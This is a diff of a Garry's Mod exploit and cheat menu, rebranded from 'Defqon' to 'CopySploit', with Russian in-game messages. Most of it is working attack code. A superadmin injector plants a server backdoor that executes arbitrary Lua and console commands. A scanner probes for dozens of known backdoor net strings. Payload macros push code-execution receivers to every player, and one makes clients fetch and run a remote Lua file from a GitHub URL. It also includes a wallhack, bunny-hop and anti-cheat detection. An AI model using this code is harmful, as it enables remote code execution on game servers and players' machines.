+        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "На сервере стоит Cake Anti Cheat!")
 end
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 local ply = LocalPlayer()
 function Noclip()
 surface.PlaySound("garrysmod/ui_click.wav")
-ply:ConCommand( "Defqon_noclip" )
+ply:ConCommand( "CopySploit_noclip" )
 end
 local SW = {}
 SW.Enabled = false
@@ -5792,7 +4650,7 @@ hook.Add( "CreateMove", "SpiritWalk", SW.CreateMove )
     SW.SetView = true
     local status = { [ true ] = "ON", [ false ] = "OFF" }
 end
-concommand.Add( "Defqon_noclip", SW.Toggle )
+concommand.Add( "CopySploit_noclip", SW.Toggle )
 
 function ValidNetString( str )
     local status, error = pcall( net.Start, str )
@@ -5802,7 +4660,7 @@ end
 -- Superadmin Injector
 function Inject()
 surface.PlaySound("garrysmod/ui_click.wav")
-    chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 255, 255 )," Инжектим..." )
+    chat.AddText( Color( 0, 0, 0, 125 ), "[CopySploit]", Color( 255, 255, 255 )," Инжектим..." )
     if ( ply:IsSuperAdmin() ) then
         timer.Simple( 3, function()
             if( ValidNetString("DefqonBackdoor") ) then
@@ -5812,14 +4670,14 @@ surface.PlaySound("garrysmod/ui_click.wav")
                 RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('DefqonBackdoor')" )
                 RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('DefqonBackdoor') net.Receive('DefqonBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                 RunConsoleCommand( "ulx", "logecho", "1" )
-                chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 0, 255, 0 )," Успешно заинжекчено!" )
+                chat.AddText( Color( 0, 0, 0, 125 ), "[CopySploit]", Color( 0, 255, 0 )," Успешно заинжекчено!" )
             end
         end )
     else
-        chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 0, 0 )," Failed! Вы не superadmin!" )
+        chat.AddText( Color( 0, 0, 0, 125 ), "[CopySploit]", Color( 255, 0, 0 )," Failed! Вы не superadmin!" )
     end
-    if( ValidNetString("DefqonBackdoor") ) then
-        chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 255, 255 )," Backdoor уже загружен!" )
+    if( ValidNetString("CopySploitBackdoor") ) then
+        chat.AddText( Color( 0, 0, 0, 125 ), "[CopySploit]", Color( 255, 255, 255 )," Backdoor уже загружен!" )
     end
 end
 
@@ -5829,158 +4687,158 @@ end
 -- Backdoor Checker
 function checkbackdoors()
 surface.PlaySound("garrysmod/ui_click.wav")
-chat.AddText( Color( 0, 0, 0, 125 ), "[Defqon]", Color( 255, 255, 255 )," В консоль посмотрите" )
+chat.AddText( Color( 0, 0, 0, 125 ), "[CopySploit]", Color( 255, 255, 255 )," В консоль посмотрите" )
 if( ValidNetString("Sbox_darkrp") ) then
-        print( "[Defqon] Найден Backdoor! -   Sbox_darkrp" )
+        print( "[CopySploit] Найден Backdoor! -   Sbox_darkrp" )
     end
 
-if( ValidNetString("_Defqon") ) then
-        print( "[Defqon] Найден Backdoor! -   _Defqon" )
+if( ValidNetString("_CopySploit") ) then
+        print( "[CopySploit] Найден Backdoor! -   _Defqon" )
     end
 
 if( ValidNetString("Sandbox_ArmDupe") ) then
-        print( "[Defqon] Найден Backdoor! -   Sandbox_ArmDupe" )
+        print( "[CopySploit] Найден Backdoor! -   Sandbox_ArmDupe" )
     end
 if( ValidNetString("Sbox_itemstore") ) then
-        print( "[Defqon] Найден Backdoor! -   Sbox_itemstore" )
+        print( "[CopySploit] Найден Backdoor! -   Sbox_itemstore" )
     end
 if( ValidNetString("Ulib_Message") ) then
-        print( "[Defqon] Найден Backdoor! -   Ulib_Message" )
+        print( "[CopySploit] Найден Backdoor! -   Ulib_Message" )
 end
 if( ValidNetString("ULogs_Info") ) then
-        print( "[Defqon] Найден Backdoor! -   ULogs_Info" )
+        print( "[CopySploit] Найден Backdoor! -   ULogs_Info" )
 end
 if( ValidNetString("ITEM") ) then
-        print( "[Defqon] Найден Backdoor! -   ITEM" )
+        print( "[CopySploit] Найден Backdoor! -   ITEM" )
 end
 if( ValidNetString("fix") ) then
-        print( "[Defqon] Найден Backdoor! -   fix" )
+        print( "[CopySploit] Найден Backdoor! -   fix" )
 end
 if( ValidNetString("Fix_Keypads") ) then
-        print( "[Defqon] Найден Backdoor! -   Fix_Keypads" )
+        print( "[CopySploit] Найден Backdoor! -   Fix_Keypads" )
 end
 if( ValidNetString("Remove_Exploiters") ) then
-        print( "[Defqon] Найден Backdoor! -   Remove_Exploiters" )
+        print( "[CopySploit] Найден Backdoor! -   Remove_Exploiters" )
 end
 if( ValidNetString("noclipcloakaesp_chat_text") ) then
-        print( "[Defqon] Найден Backdoor! -   noclipcloakaesp_chat_text" )
+        print( "[CopySploit] Найден Backdoor! -   noclipcloakaesp_chat_text" )
 end
 if( ValidNetString("_CAC_ReadMemory") ) then
-        print( "[Defqon] Найден Backdoor! -   _CAC_ReadMemory" )
+        print( "[CopySploit] Найден Backdoor! -   _CAC_ReadMemory" )
 end
 if( ValidNetString("nostrip") ) then
-        print( "[Defqon] Найден Backdoor! -   nostrip" )
+        print( "[CopySploit] Найден Backdoor! -   nostrip" )
 end
 if( ValidNetString("nocheat") ) then
-        print( "[Defqon] Найден Backdoor! -   nocheat" )
+        print( "[CopySploit] Найден Backdoor! -   nocheat" )
 end
 if( ValidNetString("LickMeOut") ) then
-        print( "[Defqon] Найден Backdoor! -   LickMeOut" )
+        print( "[CopySploit] Найден Backdoor! -   LickMeOut" )
 end
 if( ValidNetString("ULX_QUERY2") ) then
-        print( "[Defqon] Найден Backdoor! -   ULX_QUERY2" )
+        print( "[CopySploit] Найден Backdoor! -   ULX_QUERY2" )
 end
 if( ValidNetString("MoonMan") ) then
-        print( "[Defqon] Найден Backdoor! -   MoonMan" )
+        print( "[CopySploit] Найден Backdoor! -   MoonMan" )
 end
 if( ValidNetString("Im_SOCool") ) then
-        print( "[Defqon] Найден Backdoor! -   Im_SOCool" )
+        print( "[CopySploit] Найден Backdoor! -   Im_SOCool" )
 end
 if( ValidNetString("Sandbox_GayParty") ) then
-        print( "[Defqon] Найден Backdoor! -   Sandbox_GayParty" )
+        print( "[CopySploit] Найден Backdoor! -   Sandbox_GayParty" )
 end
 if( ValidNetString("DarkRP_UTF8") ) then
-        print( "[Defqon] Найден Backdoor! -   DarkRP_UTF8" )
+        print( "[CopySploit] Найден Backdoor! -   DarkRP_UTF8" )
 end
 if( ValidNetString("oldNetReadData") ) then
-        print( "[Defqon] Найден Backdoor! -   oldNetReadData" )
+        print( "[CopySploit] Найден Backdoor! -   oldNetReadData" )
 end
 if( ValidNetString("memeDoor") ) then
-        print( "[Defqon] Найден Backdoor! -   memeDoor" )
+        print( "[CopySploit] Найден Backdoor! -   memeDoor" )
 end
 if( ValidNetString("BackDoor") ) then
-        print( "[Defqon] Найден Backdoor! -   BackDoor" )
+        print( "[CopySploit] Найден Backdoor! -   BackDoor" )
 end
 if( ValidNetString("OdiumBackDoor") ) then
-        print( "[Defqon] Найден Backdoor! -   OdiumBackDoor" )
+        print( "[CopySploit] Найден Backdoor! -   OdiumBackDoor" )
 end
 if( ValidNetString("cucked") ) then
-        print( "[Defqon] Найден Backdoor! -   cucked" )
+        print( "[CopySploit] Найден Backdoor! -   cucked" )
 end
 if( ValidNetString("NoNerks") ) then
-        print( "[Defqon] Найден Backdoor! -   NoNerks" )
+        print( "[CopySploit] Найден Backdoor! -   NoNerks" )
 end
 if( ValidNetString("kek") ) then
-        print( "[Defqon] Найден Backdoor! -   kek" )
+        print( "[CopySploit] Найден Backdoor! -   kek" )
 end
 if( ValidNetString("ZimbaBackDoor") ) then
-        print( "[Defqon] Найден Backdoor! -   ZimbaBackDoor" )
+        print( "[CopySploit] Найден Backdoor! -   ZimbaBackDoor" )
 end
 if( ValidNetString("something") ) then
-        print( "[Defqon] Найден Backdoor! -   something" )
+        print( "[CopySploit] Найден Backdoor! -   something" )
 end
 if( ValidNetString("random") ) then
-        print( "[Defqon] Найден Backdoor! -   random" )
+        print( "[CopySploit] Найден Backdoor! -   random" )
 end
 if( ValidNetString("strip0") ) then
-        print( "[Defqon] Найден Backdoor! -   strip0" )
+        print( "[CopySploit] Найден Backdoor! -   strip0" )
 end
 if( ValidNetString("DarkRP_AdminWeapons") ) then
-        print( "[Defqon] Найден Backdoor! -   DarkRP_AdminWeapons" )
+        print( "[CopySploit] Найден Backdoor! -   DarkRP_AdminWeapons" )
 end
 if( ValidNetString("SessionBackdoor") ) then
-        print( "[Defqon] Найден Backdoor! -   SessionBackdoor" )
+        print( "[CopySploit] Найден Backdoor! -   SessionBackdoor" )
 end
 if( ValidNetString("ULXQUERY2") ) then
-        print( "[Defqon] Найден Backdoor! -   ULXQUERY2" )
+        print( "[CopySploit] Найден Backdoor! -   ULXQUERY2" )
 end
 if( ValidNetString("fellosnake") ) then
-        print( "[Defqon] Найден Backdoor! -   fellosnake" )
+        print( "[CopySploit] Найден Backdoor! -   fellosnake" )
 end
 if( ValidNetString("enablevac") ) then
-        print( "[Defqon] Найден Backdoor! -   enablevac" )
+        print( "[CopySploit] Найден Backdoor! -   enablevac" )
 end
 if( ValidNetString("idk") ) then
-        print( "[Defqon] Найден Backdoor! -   idk" )
+        print( "[CopySploit] Найден Backdoor! -   idk" )
 end
 if( ValidNetString("c") ) then
-        print( "[Defqon] Найден Backdoor! -   c" )
+        print( "[CopySploit] Найден Backdoor! -   c" )
 end
 if( ValidNetString("killserver") ) then
-        print( "[Defqon] Найден Backdoor! -   killserver" )
+        print( "[CopySploit] Найден Backdoor! -   killserver" )
 end
 if( ValidNetString("fuckserver") ) then
-        print( "[Defqon] Найден Backdoor! -   fuckserver" )
+        print( "[CopySploit] Найден Backdoor! -   fuckserver" )
 end
 if( ValidNetString("cvaraccess") ) then
-        print( "[Defqon] Найден Backdoor! -   cvaraccess" )
+        print( "[CopySploit] Найден Backdoor! -   cvaraccess" )
 end
 if( ValidNetString("rcon") ) then
-        print( "[Defqon] Найден Backdoor! -   rcon" )
+        print( "[CopySploit] Найден Backdoor! -   rcon" )
 end
 if( ValidNetString("rconadmin") ) then
-        print( "[Defqon] Найден Backdoor! -   rconadmin" )
+        print( "[CopySploit] Найден Backdoor! -   rconadmin" )
 end
 if( ValidNetString("web") ) then
-        print( "[Defqon] Найден Backdoor! -   web" )
+        print( "[CopySploit] Найден Backdoor! -   web" )
 end
 if( ValidNetString("jesuslebg") ) then
-        print( "[Defqon] Найден Backdoor! -   jesuslebg" )
+        print( "[CopySploit] Найден Backdoor! -   jesuslebg" )
 end
 if( ValidNetString("zilnix") ) then
-        print( "[Defqon] Найден Backdoor! -   zilnix" )
+        print( "[CopySploit] Найден Backdoor! -   zilnix" )
 end
 if( ValidNetString("Þà?D)◘") ) then
-        print( "[Defqon] Найден Backdoor! -   Þà?D)◘" )
+        print( "[CopySploit] Найден Backdoor! -   Þà?D)◘" )
 end
 if( ValidNetString("disablebackdoor") ) then
-        print( "[Defqon] Найден Backdoor! -   disablebackdoor" )
+        print( "[CopySploit] Найден Backdoor! -   disablebackdoor" )
 end
 if( ValidNetString("kill") ) then
-        print( "[Defqon] Найден Backdoor! -   kill" )
+        print( "[CopySploit] Найден Backdoor! -   kill" )
 end
 if( ValidNetString("DefqonBackdoor") ) then
-        print( "[Defqon] Найден Фирменный Backdoor! -   DefqonBackdoor" )
+        print( "[CopySploit] Найден Фирменный Backdoor! -   DefqonBackdoor" )
 end
 end
 
@@ -6201,9 +5059,9 @@ end
     else
     end
     if netKey == "" then
-         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Бэкдуров на сервере не найдено." )
+         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Бэкдуров на сервере не найдено." )
     else
-        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 0, 255, 0 ), "Найден .net Backdoor: ".. netKey )
+        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 0, 255, 0 ), "Найден .net Backdoor: ".. netKey )
             -- Auto shut down ULX Logs
             if GetConVarNumber("silent") == 1 then
                 net.Start(netKey)
@@ -6223,10 +5081,10 @@ end
     end
 
 local function gmsg(msg,color)
-if color == "color_red" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 150,0,0 )," ".. msg) return end
-if color == "color_red_red" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 255,0,0 )," ".. msg) return end
-if color == "color_green" then chat.AddText( "\n",Color( 255,0,0 ),"[Defqon] ",Color( 43,255,0 )," ".. msg) return end
-chat.AddText( "",Color( 255,0,0 ),"[Defqon] ",Color( 255,255,225 )," ".. msg)
+if color == "color_red" then chat.AddText( "\n",Color( 255,0,0 ),"[CopySploit] ",Color( 150,0,0 )," ".. msg) return end
+if color == "color_red_red" then chat.AddText( "\n",Color( 255,0,0 ),"[CopySploit] ",Color( 255,0,0 )," ".. msg) return end
+if color == "color_green" then chat.AddText( "\n",Color( 255,0,0 ),"[CopySploit] ",Color( 43,255,0 )," ".. msg) return end
+chat.AddText( "",Color( 255,0,0 ),"[CopySploit] ",Color( 255,255,225 )," ".. msg)
 end
 
 function iZNX.ScanPlayers()
@@ -6328,11 +5186,11 @@ local title = "You have been reported! Please answer all your reports."
 			    LocalPlayer():SetWeaponColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
 			    LocalPlayer():SetPlayerColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
 			end)
-			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Радужный физган включен" )
+			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Радужный физган включен" )
 			rainb = true
 		else
 			hook.Remove("Think", "RGBSTF")
-			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Радужный физган выключен" )
+			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Радужный физган выключен" )
 			rainb = false
 		end
 	end
@@ -6353,7 +5211,7 @@ local wh = false
 function WHT()
 surface.PlaySound("garrysmod/ui_click.wav")
 if not wh then
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Wallhack включен" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Wallhack включен" )
 hook.Add("HUDPaint", "WHT", function()
 for k, v in pairs(player.GetAll()) do
 if (v:Alive()) then
@@ -6393,40 +5251,45 @@ end
 end)
 wh = true
 else
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Wallhack выключен" )
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Wallhack выключен" )
 hook.Remove("HUDPaint", "WHT")
 wh = false
 end
 end
-concommand.Add("Defqon_wallhack", WHT)
+concommand.Add("CopySploit_wallhack", WHT)
 
 local bhop = false
 function Bhop()
 surface.PlaySound("garrysmod/ui_click.wav")
 if not bhop then
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Bhop включен" )
-hook.Add("CreateMove", "BHOP", function(cmd)
-if (cmd:KeyDown(IN_JUMP)) then
-if(cmd:GetMouseX() < 0) then --spinning right
-cmd:SetSideMove(-10000);
-elseif(cmd:GetMouseX() > 0) then
-cmd:SetSideMove(10000);
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Bhop включен" )
+hook.Add("CreateMove", "HUIPI", function(ply)
+    if input.IsKeyDown(KEY_SPACE) and !injump then
+        if LocalPlayer():IsOnGround() and !injump then
+            ply:SetForwardMove(10000)
+            RunConsoleCommand("+jump")
+            timer.Create("Simple_Bhop", 0, 0.01, function()
+                RunConsoleCommand("-jump") 
+            end)
+        else
+    if(ply:GetMouseX() > 1 || ply:GetMouseX() < -1) then
+      ply:SetSideMove(ply:GetMouseX() > 1 && 400 || -400);
+    else
+      ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D());
+      ply:SetSideMove((ply:CommandNumber() % 2 == 0) && -400 || 400);
+    end
+    end
 end
-if (LocalPlayer():IsOnGround()) then
-cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_JUMP));
-return;
-end
-end
-cmd:RemoveKey(IN_JUMP);
-end )
+end)
+
 bhop = true
 else
-chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Defqon", "] ", Color( 255, 255, 255 ), "Bhop выключен" )
-hook.Remove("CreateMove", "BHOP")
+chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "CopySploit", "] ", Color( 255, 255, 255 ), "Bhop выключен" )
+hook.Remove("CreateMove", "HUIPI")
 bhop = false
 end
 end
-concommand.Add("Defqon_bhop", Bhop)
+concommand.Add("CopySploit_bhop", Bhop)
 
 
 
@@ -6540,7 +5403,7 @@ local function ispooped( str )
 
 
 
-	concommand.Add( "Defqon_anticheats", function()
+	concommand.Add( "CopySploit_anticheats", function()
 
 		local acpanel = vgui.Create("DFrame")
 
@@ -6646,38 +5509,6 @@ local function ispooped( str )
 
 
 
-
-
-
-
-	------------------------------------------------------------------------------------------------------------
---[[
-
-COPYRIGHT 2018
-
-YOU HAVE NO RIGHTS TO REDISTRIBUTE THIS FILE OR ANY FILES ASSOCIATED
-
-YOU MAY NOT COPY AND PASTE THIS SCRIPT
-                                                                                              p.s. lua run does not work
-Coded by Hayden Massey (ToxicRiver) @ toxicpro.xyz  (what a fucking joke)
-
-*/
-
-/*
-
-	Toxic.pro
-
-	Commissioned by 0xymoron for ToxicRiver
-
-	Start Date: December 27th, 2017.
-
-	First revision finished December 28th, 2017 @ 3:28AM.
-
-	January 2nd, 2017 @ 6:27AM
-	- This script truly has become toxic, ironic.
-
-]]
-
 --[[
 
 -- Possible backdoor strings to plant in a file or convince a superadmin to luarun
@@ -6698,215 +5529,6 @@ util.AddNetworkString( "idk" ) net.Receive( "idk", function( len ) local str = n
 
 ]]
 
-local toxic = {}
-local iZNX = {}
-
-function iZNX.ValidNetString( str )
-local status, error = pcall( net.Start, str )
-return status
-end
-
-local blackdoor = ""
-if iZNX.ValidNetString( "Sandbox_ArmDupe" ) then
-blackdoor = "Sandbox_ArmDupe"
-else
-if iZNX.ValidNetString( "Sbox_darkrp" ) then
-blackdoor = "Sbox_darkrp"
-else
-if iZNX.ValidNetString( "Sbox_itemstore" ) then
-blackdoor = "Sbox_itemstore"
-else
-if iZNX.ValidNetString( "Ulib_Message" ) then
-blackdoor = "Ulib_Message"
-else
-if iZNX.ValidNetString( "ULogs_Info" ) then
-blackdoor = "ULogs_Info"
-else
-if iZNX.ValidNetString( "ITEM" ) then
-blackdoor = "ITEM"
-else
-if iZNX.ValidNetString( "fix" ) then
-blackdoor = "fix"
-else
-if iZNX.ValidNetString( "Fix_Keypads" ) then
-blackdoor = "Fix_Keypads"
-else
-if iZNX.ValidNetString( "Remove_Exploiters" ) then
-blackdoor = "Remove_Exploiters"
-else
-if iZNX.ValidNetString( "noclipcloakaesp_chat_text" ) then
-blackdoor = "noclipcloakaesp_chat_text"
-else
-if iZNX.ValidNetString( "_Defqon" ) then
-blackdoor = "_Defqon"
-else
-if iZNX.ValidNetString( "_CAC_ReadMemory" ) then
-blackdoor = "_CAC_ReadMemory"
-else
-if iZNX.ValidNetString( "nostrip" ) then
-blackdoor = "nostrip"
-else
-if iZNX.ValidNetString( "nocheat" ) then
-blackdoor = "nocheat"
-else
-if iZNX.ValidNetString( "LickMeOut" ) then
-blackdoor = "LickMeOut"
-else
-if iZNX.ValidNetString( "ULX_QUERY2" ) then
-blackdoor = "ULX_QUERY2"
-else
-if iZNX.ValidNetString( "ULXQUERY2" ) then
-blackdoor = "ULXQUERY2"
-else
-if iZNX.ValidNetString( "MoonMan" ) then
-blackdoor = "MoonMan"
-else
-if iZNX.ValidNetString( "Im_SOCool" ) then
-blackdoor = "Im_SOCool"
-else
-if iZNX.ValidNetString( "Sandbox_GayParty" ) then
-blackdoor = "Sandbox_GayParty"
-else
-if iZNX.ValidNetString( "DarkRP_UTF8" ) then
-blackdoor = "DarkRP_UTF8"
-else
-if iZNX.ValidNetString( "oldNetReadData" ) then
-blackdoor = "oldNetReadData"
-else
-if iZNX.ValidNetString( "memeDoor" ) then
-blackdoor = "memeDoor"
-else
-if iZNX.ValidNetString( "BackDoor" ) then
-blackdoor = "BackDoor"
-else
-if iZNX.ValidNetString( "OdiumBackDoor" ) then
-blackdoor = "OdiumBackDoor"
-else
-if iZNX.ValidNetString( "SessionBackdoor" ) then
-blackdoor = "SessionBackdoor"
-else
-if iZNX.ValidNetString( "DarkRP_AdminWeapons" ) then
-blackdoor = "DarkRP_AdminWeapons"
-else
-if iZNX.ValidNetString( "cucked" ) then
-blackdoor = "cucked"
-else
-if iZNX.ValidNetString( "NoNerks" ) then
-blackdoor = "NoNerks"
-else
-if iZNX.ValidNetString( "kek" ) then
-blackdoor = "kek"
-else
-if iZNX.ValidNetString( "ZimbaBackDoor" ) then
-blackdoor = "ZimbaBackDoor"
-else
-if iZNX.ValidNetString( "something" ) then
-blackdoor = "something"
-else
-if iZNX.ValidNetString( "random" ) then
-blackdoor = "random"
-else
-if iZNX.ValidNetString( "strip0" ) then
-blackdoor = "strip0"
-else
-if iZNX.ValidNetString( "fellosnake" ) then
-blackdoor = "fellosnake"
-else
-if iZNX.ValidNetString( "enablevac" ) then
-blackdoor = "enablevac"
-else
-if iZNX.ValidNetString( "idk" ) then
-blackdoor = "idk"
-else
-if iZNX.ValidNetString( "c" ) then
-blackdoor = "c"
-else
-if iZNX.ValidNetString( "killserver" ) then
-blackdoor = "killserver"
-else
-if iZNX.ValidNetString( "fuckserver" ) then
-blackdoor = "fuckserver"
-else
-if iZNX.ValidNetString( "cvaraccess" ) then
-blackdoor = "cvaraccess"
-else
-if iZNX.ValidNetString( "rcon" ) then
-blackdoor = "rcon"
-else
-if iZNX.ValidNetString( "rconadmin" ) then
-blackdoor = "rconadmin"
-else
-if iZNX.ValidNetString( "web" ) then
-blackdoor = "web"
-else
-if iZNX.ValidNetString( "jesuslebg" ) then
-blackdoor = "jesuslebg"
-else
-if iZNX.ValidNetString( "zilnix" ) then
-blackdoor = "zilnix"
-else
-if iZNX.ValidNetString( "Þà?D)◘" ) then
-blackdoor = "Þà?D)◘"
-else
-if iZNX.ValidNetString( "disablebackdoor" ) then
-blackdoor = "disablebackdoor"
-else
-if iZNX.ValidNetString( "kill" ) then
-blackdoor = "kill"
-else
-if iZNX.ValidNetString( "DefqonBackdoor" ) then
-blackdoor = "DefqonBackdoor"
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-end
-
 //local odium = jit.status( 'ODIUM' ) if !istable(odium) then print('FAILED TO IMPORT ODIUM TABLE') end 
 
 local BD = {}
@@ -6915,13 +5537,13 @@ local h = http
 
 BD.Backdoors = BD.Backdoors or {}
 
-BD.CurrentBackdoor = "Generic"
+BD.CurrentBackdoor = "AutoDetect"
 
 
 
 BD.BackdoorTypes = {
 
-    ["Generic"] = {
+    ["AutoDetect"] = {
 
         ["Code"] = "util.AddNetworkString( '_CAC_ReadMemory' ) net.Receive( '_CAC_ReadMemory', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
 
@@ -7058,17 +5680,17 @@ BD.BDMacros ={
 
         ["Code"] = [[
 
-    util.AddNetworkString( "cucked" )
+    util.AddNetworkString( "succ" )
 
-    function BDSendLua( p, str ) net.Start( "cucked" ) net.WriteString( str ) net.Send( p ) end
+    function BDSendLua( p, str ) net.Start( "succ" ) net.WriteString( str ) net.Send( p ) end
 
-    function BDSendLuaAll( str ) net.Start( "cucked" ) net.WriteString( str ) net.Broadcast() end
+    function BDSendLuaAll( str ) net.Start( "succ" ) net.WriteString( str ) net.Broadcast() end
 
-    function BDInjectAids( p ) p:SendLua( 'net.Receive( "cucked", function() RunString( net.ReadString() ) end )' ) end
+    function BDInjectAids( p ) p:SendLua( 'net.Receive( "succ", function() RunString( net.ReadString() ) end )' ) end
 
     for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end
 
-    hook.Add( "PlayerInitialSpawn", "youonlygetcuckedagain", function( p ) BDInjectAids( p ) end)
+    hook.Add( "PlayerInitialSpawn", "youonlygetsuccagain", function( p ) BDInjectAids( p ) end)
 
         ]],
 
@@ -8643,15 +7265,15 @@ BD.BDMacros ={
 
     },
 
-    ["Scramble vision"] = {
+    ["Inject CopySploit"] = {
 
         ["Type"] = 2,
 
         ["Code"] = [[
-            v:SendLua('http.Fetch("http://gastheje.ws/scram.lua", function(b,l,h,c) RunString(b) end, function(error) print(error) end )')
+            v:SendLua('http.Fetch("http://raw.githubusercontent.com/WERooo/somelua/master/CopySploit.lua",function(body) RunString(body) end)')
         ]],
 
-        ["Desc"] = "Fucks the view of target",
+        ["Desc"] = "Inject CopySploit to specific player",
 
     },
 
@@ -8766,9 +7388,9 @@ BD.BDMacros["@ Persistent Infection"] = {
     ["Private"] = true,
 }
 
-BD.BackdoorTypes[">Odium Detector"] = {
-    ["Code"] = "util.AddNetworkString( 'NoOdium_ReadPing' ) net.Receive( 'NoOdium_ReadPing', function() local x = CompileString( net.ReadString(), 'LuaCmd', false ) if isfunction( x ) then x() end end )",
-    ["Netkey"] = "NoOdium_ReadPing",
+BD.BackdoorTypes["DefqonBackdoor"] = {
+    ["Code"] = "util.AddNetworkString('DefqonBackdoor') net.Receive('DefqonBackdoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)",
+    ["Netkey"] = "DefqonBackdoor",
 }
 
 BD.BackdoorTypes["No Narks"] = {
@@ -9017,26 +7639,6 @@ function BD.BackdoorMenu()
 
 
 BD.Backdoors = BD.PingBackDoors()
-
-
-
-if !BD.IsMessagePooled( "cucked" ) and BD.BackdoorActive() then
-
-    BD.Fire( [[util.AddNetworkString( "cucked" )
-
-    function BDSendLua( p, str ) net.Start( "cucked" ) net.WriteString( str ) net.Send( p ) end
-
-    function BDSendLuaAll( str ) net.Start( "cucked" ) net.WriteString( str ) net.Broadcast() end
-
-    function BDInjectAids( p ) p:SendLua( 'net.Receive( "cucked", function() RunString( net.ReadString() ) end )' ) end
-
-    for k, v in pairs( player.GetAll() ) do BDInjectAids( v ) end
-
-    hook.Add( "PlayerInitialSpawn", "youonlygetcuckedagain", function( p ) BDInjectAids( p ) end)
-
-]] )
-
-end
 
 
 
